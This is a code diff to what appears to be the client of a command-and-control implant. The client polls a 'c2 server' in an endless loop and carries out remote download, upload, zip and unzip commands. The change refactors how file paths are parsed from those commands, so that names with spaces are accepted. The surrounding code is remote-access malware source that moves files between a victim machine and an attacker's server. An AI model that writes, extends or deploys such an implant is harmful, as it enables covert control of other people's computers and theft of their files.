@@ -30,16 +30,13 @@ def post_to_server(message: str, response_path: str = RESPONSE):
     except exceptions.RequestException:
         return
 
-def get_third_item(input_string, replace=True):
-    """ This is the function that splits a string and returns the 3rd item. Bt default, all forward slashes in the 3rd
-    item are changed to backslashes. This can be disabled if replace is set to False during the call. """
+def get_filename(input_string, replace=True):
+    """ This is a function that splits apart a string on whitespace and returns items 3 and greater, wihch should be a 
+    filename according to our use-cases. """
     try:
-        if replace:
-            return input_string.split()[2].replace("\\", "/")
-        else:
-            return input_string.split()[2]
+            return " ".join(input_string.split()[2:]).replace("\\", "/")
     except IndexError:
-        post_to_server(f"You must enter an argument after {input_string}.\n")
+        post_to_server(f"You must enter a filename after {input_string}.\n")
 
 # Try an HTTP GET request to the c2 server and retrieve a response; if it fails, keep trying forever
 while True:
@@ -81,7 +78,7 @@ while True:
     elif command.startswith("client download"):
 
         # Split out the filepath to download and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we had an IndexError, start a new iteration of the while loop
         if filepath is None:
@@ -107,7 +104,7 @@ while True:
     elif command.startswith("client upload"):
         
         # Split out the filepath to download and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we had an Index Error, start a new interation of the while loop
         if filepath is None:
@@ -131,7 +128,7 @@ while True:
     elif command.startswith("client zip"):
 
         # Split out the filepath to download and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we had an Index Error, start a new interation of the while loop
         if filepath is None:
@@ -160,7 +157,7 @@ while True:
     elif command.startswith("client unzip"):
 
         # Split out the filepath to unzip and replace \ with /
-        filepath = get_third_item(command)
+        filepath = get_filename(command)
 
         # If we had an Index Error, start a new interation of the while loop
         if filepath is None:
